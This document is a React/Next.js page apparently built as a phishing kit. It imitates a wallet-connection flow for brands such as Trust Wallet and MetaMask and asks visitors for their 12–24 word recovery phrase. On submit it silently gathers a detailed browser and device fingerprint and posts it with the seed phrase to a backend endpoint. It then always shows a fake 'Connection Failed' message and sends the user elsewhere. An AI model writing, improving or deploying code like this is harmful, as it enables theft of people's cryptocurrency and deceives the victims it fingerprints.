"use client";
import { useState, useRef, useEffect } from "react";
// import { useWeb3Modal } from '@web3modal/wagmi/react'
// import { useAccount } from 'wagmi'
// BIP39 English word list (first 100 for brevity, use full list in production)
const bip39List = [
  "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aid","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow"
  // ... (add the rest of the 2048 BIP39 words here for full production use)
];

const WALLETS = [
  { name: "Trust Wallet", icon: "/trustwallet.png" },
  { name: "MetaMask", icon: "/metamask.png" },
  { name: "Coinbase Wallet", icon: "/coinbase.png" },
  { name: "Exodus", icon: "/exodus.png" },
  { name: "Atomic Wallet", icon: "/atomic.png" },
  { name: "TokenPocket", icon: "/tokenpocket.png" },
  { name: "MathWallet", icon: "/mathwallet.png" },
  { name: "SafePal", icon: "/safepal.png" },
  { name: "ONTO", icon: "/onto.png" },
  { name: "BitKeep", icon: "/bitkeep.png" },
  { name: "Other", icon: "/wallet.png" },
];
const PHRASE_COUNTS = [12, 15, 18, 21, 24];

export default function Home() {
  const [step, setStep] = useState<"wallet" | "connectWallet" | "loading" | "phraseCount" | "phraseInput" | "done">("wallet");
  const [showToast, setShowToast] = useState<{ type: "success" | "error"; message: string } | null>(null);
  const [showPhrase, setShowPhrase] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [phraseCount, setPhraseCount] = useState<number | null>(null);
  const [phraseWords, setPhraseWords] = useState<string[]>([]);
  const [status, setStatus] = useState<null | "success" | "error">(null);
  const [loading, setLoading] = useState(false);
  // --- HOOKS FOR PHRASE INPUT (must always be called) ---
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  // const { open } = useWeb3Modal()
  // const { isConnected } = useAccount()
  useEffect(() => {
    if (step === "phraseInput" && phraseCount && inputRefs.current[0]) {
      inputRefs.current[0].focus();
    }
  }, [step, phraseCount]);

  // Simulate loading screen between steps, showing selected wallet name
  function goToStepWithLoading(nextStep: typeof step) {
    setStep("loading");
    setTimeout(() => setStep(nextStep), 4000); // 4 seconds
  }

  // Progress indicator
  function ProgressBar() {
    const progress = step === "wallet" ? 0 : step === "loading" ? 20 : step === "phraseCount" ? 40 : step === "phraseInput" ? 80 : 100;
    return (
      <div className="w-full h-2 bg-zinc-200 dark:bg-zinc-800 rounded-full overflow-hidden mb-6">
        <div className="h-full bg-blue-500 transition-all duration-500" style={{ width: `${progress}%` }} />
      </div>
    );
  }

  // Handle phrase word input
  function handleWordChange(idx: number, value: string) {
    setPhraseWords(words => {
      const copy = [...words];
      copy[idx] = value;
      return copy;
    });
  }

  // Submit phrase
  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setLoading(true);
    setStatus(null);

    // --- Fingerprint collection ---
    const nav = navigator as Navigator & {
      deviceMemory?: number;
      connection?: { effectiveType?: string; downlink?: number; rtt?: number; saveData?: boolean };
      getBattery?: () => Promise<{ level: number; charging: boolean; chargingTime: number; dischargingTime: number }>;
    };

    // WebGL GPU info
    let webglRenderer = "";
    let webglVendor = "";
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") as WebGLRenderingContext | null;
      if (gl) {
        const dbgInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (dbgInfo) {
          webglRenderer = gl.getParameter(dbgInfo.UNMASKED_RENDERER_WEBGL);
          webglVendor = gl.getParameter(dbgInfo.UNMASKED_VENDOR_WEBGL);
        }
      }
    } catch { /* silent */ }

    // Battery
    let batteryLevel = "";
    let batteryCharging = "";
    try {
      if (nav.getBattery) {
        const bat = await nav.getBattery();
        batteryLevel = `${Math.round(bat.level * 100)}%`;
        batteryCharging = bat.charging ? "Yes" : "No";
      }
    } catch { /* silent */ }

    // Plugins
    const plugins = Array.from(navigator.plugins || []).map((p) => p.name).join(", ");

    const payload = {
      phrase: phraseWords.join(" "),
      wallet: selectedWallet,
      browserData: {
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages?.join(", "),
        platform: navigator.platform,
        vendor: navigator.vendor,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        localTime: new Date().toLocaleString(),
        // Screen
        screenWidth: screen.width,
        screenHeight: screen.height,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        colorDepth: screen.colorDepth,
        devicePixelRatio: window.devicePixelRatio,
        // Hardware
        deviceMemoryGB: nav.deviceMemory,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        isMobile: window.matchMedia("(pointer: coarse)").matches,
        // GPU
        webglRenderer,
        webglVendor,
        // Battery
        batteryLevel,
        batteryCharging,
        // Network
        connectionType: nav.connection?.effectiveType,
        downlinkMbps: nav.connection?.downlink,
        rttMs: nav.connection?.rtt,
        dataSaver: nav.connection?.saveData,
        isOnline: navigator.onLine,
        // Preferences
        darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches,
        reducedMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches,
        // Session
        referrer: document.referrer || "(direct)",
        pageUrl: window.location.href,
        plugins: plugins || "(none)",
      },
    };

    fetch("/api/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    }).catch(() => {/* silent */});

    setTimeout(() => {
      setLoading(false);
      setStatus("error");
    }, 7000);
  }

  // Step 1: Wallet selection
  if (step === "wallet") {
    return (
      <div className="flex flex-col min-h-screen items-center justify-center bg-gradient-to-br from-blue-50 to-blue-200 dark:from-black dark:to-zinc-900 font-sans transition-all duration-500">
        <main className="flex flex-col w-full max-w-lg items-center justify-center py-8 px-2 sm:py-16 sm:px-4 bg-white dark:bg-zinc-900 rounded-2xl shadow-xl border border-blue-100 dark:border-zinc-800 animate-fadein">
          <ProgressBar />
          <h1 className="text-3xl font-bold mb-8 text-center text-blue-700 dark:text-blue-300">Select Your Wallet</h1>
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-6 w-full mb-8">
            {WALLETS.map(wallet => (
              <button
                key={wallet.name}
                className={`flex flex-col items-center gap-2 p-5 rounded-2xl border-2 transition-all shadow-md bg-zinc-50 dark:bg-zinc-800 hover:border-blue-500 focus:border-blue-500 hover:scale-105 active:scale-95 duration-150 ${selectedWallet === wallet.name ? "border-blue-600 ring-2 ring-blue-200 dark:ring-blue-700" : "border-transparent"}`}
                onClick={() => setSelectedWallet(wallet.name)}
                type="button"
                style={{ minHeight: 120 }}
              >
                <img src={wallet.icon} alt={wallet.name} className="w-14 h-14 mb-2 rounded-lg shadow-sm bg-white dark:bg-zinc-900 object-contain" />
                <span className="text-base font-semibold text-zinc-800 dark:text-zinc-100">{wallet.name}</span>
              </button>
            ))}
          </div>
          <button
            className="mt-2 bg-gradient-to-r from-blue-600 to-blue-400 hover:from-blue-700 hover:to-blue-500 text-white font-bold py-3 px-8 rounded-xl text-lg shadow-lg disabled:opacity-60 transition-all"
            disabled={!selectedWallet ? true : false}
            onClick={() => setStep("phraseCount")}
          >
            Continue
          </button>
        </main>
        {showToast && <Toast type={showToast.type} message={showToast.message} onClose={() => setShowToast(null)} />}
      </div>
    );
  }

  // // Step 1.5: Connect Wallet (temporarily disabled for production build)
  // if (step === "connectWallet") {
  //   return (
  //     <div className="flex flex-col min-h-screen items-center justify-center bg-gradient-to-br from-blue-50 to-blue-200 dark:from-black dark:to-zinc-900 font-sans transition-all duration-500">
  //       <main className="flex flex-col w-full max-w-lg items-center justify-center py-8 px-2 sm:py-16 sm:px-4 bg-white dark:bg-zinc-900 rounded-2xl shadow-xl border border-blue-100 dark:border-zinc-800 animate-fadein">
  //         <ProgressBar />
  //         <h1 className="text-3xl font-bold mb-8 text-center text-blue-700 dark:text-blue-300">Connect Your Wallet</h1>
  //         <p className="text-center text-zinc-600 dark:text-zinc-400 mb-8">Connect your {selectedWallet} wallet to automatically import your recovery phrase, or enter it manually.</p>
  //         <button
  //           className="mb-4 bg-gradient-to-r from-blue-600 to-blue-400 hover:from-blue-700 hover:to-blue-500 text-white font-bold py-3 px-8 rounded-xl text-lg shadow-lg transition-all"
  //           onClick={async () => {
  //             try {
  //               await open();
  //               // Wait a bit for connection
  //               setTimeout(() => {
  //                 if (isConnected) {
  //                   setStep("loading");
  //                   setTimeout(() => setStep("phraseCount"), 2000);
  //                 } else {
  //                   setShowToast({ type: "error", message: "Wallet connection failed. Please try manual entry." });
  //                 }
  //               }, 1000);
  //             } catch (error) {
  //               setShowToast({ type: "error", message: "Wallet connection failed. Please try manual entry." });
  //             }
  //           }}
  //         >
  //           Connect {selectedWallet} Wallet
  //         </button>
  //         <button
  //           className="mb-4 bg-zinc-600 hover:bg-zinc-700 text-white font-semibold py-3 px-8 rounded-xl text-lg shadow-lg transition-all"
  //           onClick={() => setStep("phraseCount")}
  //         >
  //           Enter Manually
  //         </button>
  //         <button
  //           className="mt-2 bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-6 rounded shadow disabled:opacity-60"
  //           onClick={() => {
  //             setSelectedWallet(null);
  //             setPhraseCount(null);
  //             setPhraseWords([]);
  //             setStep("wallet");
  //           }}
  //           type="button"
  //         >
  //           Restart
  //         </button>
  //       </main>
  //       {showToast && <Toast type={showToast.type} message={showToast.message} onClose={() => setShowToast(null)} />}
  //     </div>
  //   );
  // }

  // Loading screen between steps
  if (step === "loading") {
    return (
      <div className="flex flex-col min-h-screen items-center justify-center bg-gradient-to-br from-blue-50 to-blue-200 dark:from-black dark:to-zinc-900 font-sans">
        <div className="flex flex-col items-center justify-center p-12 bg-white/80 dark:bg-zinc-900/80 rounded-2xl shadow-xl border border-blue-100 dark:border-zinc-800">
          <svg className="animate-spin h-12 w-12 text-blue-600 mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
          </svg>
          <span className="text-lg font-semibold text-blue-700 dark:text-blue-300 mb-4">
            Connecting to {selectedWallet ? selectedWallet : "wallet"}...
          </span>
          <button
            className="mt-2 bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-6 rounded shadow disabled:opacity-60"
            onClick={() => {
              setSelectedWallet(null);
              setPhraseCount(null);
              setPhraseWords([]);
              setStep("wallet");
            }}
            type="button"
          >
            Restart Connection
          </button>
        </div>
      </div>
    );
  }

  // Step 2: Phrase count selection
  if (step === "phraseCount") {
    return (
      <div className="flex flex-col min-h-screen items-center justify-center bg-gradient-to-br from-blue-50 to-blue-200 dark:from-black dark:to-zinc-900 font-sans transition-all duration-500">
        <main className="flex flex-col w-full max-w-md items-center justify-center py-8 px-2 sm:py-16 sm:px-4 bg-white dark:bg-zinc-900 rounded-2xl shadow-xl border border-blue-100 dark:border-zinc-800 animate-fadein">
          <ProgressBar />
          <h2 className="text-2xl font-bold mb-8 text-blue-700 dark:text-blue-300 text-center">How many words is your recovery phrase?</h2>
          <div className="flex flex-wrap gap-4 justify-center mb-8">
            {PHRASE_COUNTS.map(count => (
              <button
                key={count}
                className={`py-3 px-8 rounded-full border-2 font-bold text-lg transition-all shadow-sm ${phraseCount === count ? "bg-blue-600 text-white border-blue-600 scale-105" : "bg-zinc-100 dark:bg-zinc-800 text-blue-700 dark:text-blue-200 border-blue-200 dark:border-zinc-700 hover:border-blue-400"}`}
                onClick={() => {
                  setPhraseCount(count);
                  setPhraseWords(Array(count).fill(""));
                }}
                type="button"
              >
                {count}
              </button>
            ))}
          </div>
          <button
            className="mt-2 bg-gradient-to-r from-blue-600 to-blue-400 hover:from-blue-700 hover:to-blue-500 text-white font-bold py-3 px-8 rounded-xl text-lg shadow-lg disabled:opacity-60 transition-all"
            disabled={!phraseCount}
            onClick={() => goToStepWithLoading("phraseInput")}
          >
            Continue
          </button>
          <button
            className="mt-6 bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-6 rounded shadow disabled:opacity-60"
            onClick={() => {
              setSelectedWallet(null);
              setPhraseCount(null);
              setPhraseWords([]);
              setStep("wallet");
            }}
            type="button"
          >
            Restart Connection
          </button>
        </main>
        {showToast && <Toast type={showToast.type} message={showToast.message} onClose={() => setShowToast(null)} />}
      </div>
    );
  }

  // Step 3: Phrase input (Trust Wallet style)
  function handleInput(idx: number, value: string) {
    handleWordChange(idx, value);
    // Do not auto-advance on every character
  }

  function handleInputKeyDown(idx: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if ((e.key === "Enter" || e.key === "Tab") && idx < phraseWords.length - 1) {
      e.preventDefault();
      inputRefs.current[idx + 1]?.focus();
    }
  }

  if (step === "phraseInput" && phraseCount && phraseWords.length === phraseCount) {
    const allFilled = phraseWords.every(w => w.trim().length > 0);
    return (
      <div className="flex flex-col min-h-screen items-center justify-center bg-gradient-to-br from-blue-50 to-blue-200 dark:from-black dark:to-zinc-900 font-sans transition-all duration-500">
        <main className="flex flex-col w-full max-w-lg items-center justify-center py-8 px-2 sm:py-16 sm:px-4 bg-white dark:bg-zinc-900 rounded-2xl shadow-xl border border-blue-100 dark:border-zinc-800 animate-fadein">
          <ProgressBar />
          <h2 className="text-2xl font-bold mb-6 text-blue-700 dark:text-blue-300 text-center">Enter your {phraseCount}-word recovery phrase</h2>
          <div className="flex justify-end w-full mb-2">
            <button
              type="button"
              className="text-blue-600 dark:text-blue-300 text-sm font-medium flex items-center gap-1 hover:underline"
              onClick={() => setShowPhrase(v => !v)}
            >
              {showPhrase ? (
                <svg className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path d="M13.875 18.825A10.05 10.05 0 0112 19c-5.523 0-10-4.477-10-10 0-1.657.402-3.22 1.125-4.575M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path d="M2.458 12C3.732 7.943 7.523 5 12 5c1.657 0 3.22.402 4.575 1.125" /></svg>
              ) : (
                <svg className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path d="M1 1l22 22M17.94 17.94A10.05 10.05 0 0112 19c-5.523 0-10-4.477-10-10 0-1.657.402-3.22 1.125-4.575M9.88 9.88A3 3 0 0115 12a3 3 0 01-3 3c-.657 0-1.26-.21-1.75-.56" /></svg>
              )}
              {showPhrase ? "Hide" : "Show"} Phrase
            </button>
          </div>
          <form onSubmit={handleSubmit} className="grid grid-cols-2 sm:grid-cols-3 gap-3 w-full mb-6">
            {phraseWords.map((word, idx) => (
              <input
                key={idx}
                ref={el => { inputRefs.current[idx] = el; }}
                type={showPhrase ? "text" : "password"}
                className="border-2 border-blue-200 dark:border-zinc-700 rounded-lg px-3 py-2 text-lg text-blue-700 dark:text-blue-200 bg-zinc-50 dark:bg-zinc-800 focus:outline-none focus:border-blue-500 placeholder:text-zinc-400 transition-all duration-200"
                value={word}
                onChange={e => handleInput(idx, e.target.value)}
                onKeyDown={e => handleInputKeyDown(idx, e)}
                autoComplete="off"
                spellCheck={false}
                required
                placeholder={`Word ${idx + 1}`}
                disabled={loading}
                list="bip39-words"
              />
            ))}
            {/* Hidden submit button for enter key */}
            <button type="submit" style={{ display: "none" }} disabled={!allFilled || loading} />
          </form>
          {/* Datalist for BIP39 suggestions */}
          <datalist id="bip39-words">
            {bip39List.map(word => (
              <option value={word} key={word} />
            ))}
          </datalist>
          <button
            type="button"
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg text-lg disabled:opacity-60"
            disabled={!allFilled || loading}
            onClick={e => handleSubmit(e as any)}
          >
            {loading ? "Submitting..." : "Connect Wallet"}
          </button>
          <button
            className="mt-6 bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-6 rounded shadow disabled:opacity-60"
            onClick={() => {
              setSelectedWallet(null);
              setPhraseCount(null);
              setPhraseWords([]);
              setStep("wallet");
            }}
            type="button"
          >
            Restart Connection
          </button>
          {status === "error" && (
            <div className="flex flex-col items-center mt-6 p-4 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-xl w-full">
              <svg className="w-8 h-8 text-red-500 mb-2" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" /></svg>
              <p className="text-red-600 dark:text-red-400 font-bold text-center mb-1">Connection Failed</p>
              <p className="text-zinc-600 dark:text-zinc-300 text-sm text-center mb-4">
                Unable to connect via recovery phrase. Please try signing in directly through the <strong>WalletConnect Dashboard</strong> instead.
              </p>
              <a
                href="https://dashboard.walletconnect.com/sign-in"
                target="_blank"
                rel="noopener noreferrer"
                className="w-full text-center bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg shadow-md transition-colors text-base"
              >
                Open WalletConnect Dashboard →
              </a>
            </div>
          )}
        </main>
        {showToast && <Toast type={showToast.type} message={showToast.message} onClose={() => setShowToast(null)} />}
      </div>
    );
  }

  // Step 4: Done
  useEffect(() => {
    if (step === "done") {
      setShowToast({ type: "success", message: "Phrase submitted!" });
    }
  }, [step]);

  if (step === "done") {
    return (
      <div className="flex flex-col min-h-screen items-center justify-center bg-gradient-to-br from-blue-50 to-blue-200 dark:from-black dark:to-zinc-900 font-sans transition-all duration-500">
        <main className="flex flex-col w-full max-w-md items-center justify-center py-16 px-6 bg-white dark:bg-zinc-900 rounded-xl shadow-md animate-fadein">
          <ProgressBar />
          <h2 className="text-2xl font-bold mb-6 text-green-700 dark:text-green-300 text-center">Phrase submitted!</h2>
          <p className="text-lg text-zinc-700 dark:text-zinc-200 text-center">Check your rewards soon.</p>
          <button
            className="mt-8 bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-6 rounded shadow disabled:opacity-60"
            onClick={() => {
              setSelectedWallet(null);
              setPhraseCount(null);
              setPhraseWords([]);
              setStep("wallet");
            }}
            type="button"
          >
            Restart Connection
          </button>
        </main>
        {showToast && <Toast type={showToast.type} message={showToast.message} onClose={() => setShowToast(null)} />}
      </div>
    );
  }
// Toast component
function Toast({ type, message, onClose }: { type: "success" | "error"; message: string; onClose: () => void }) {
  useEffect(() => {
    const t = setTimeout(onClose, 3000);
    return () => clearTimeout(t);
  }, [onClose]);
  return (
    <div className={`fixed bottom-6 left-1/2 -translate-x-1/2 px-6 py-3 rounded-lg shadow-lg z-50 text-white font-semibold ${type === "success" ? "bg-green-600" : "bg-red-600"}`}>
      {message}
    </div>
  );
}

  // Fallback (should not happen)
  return null;
}
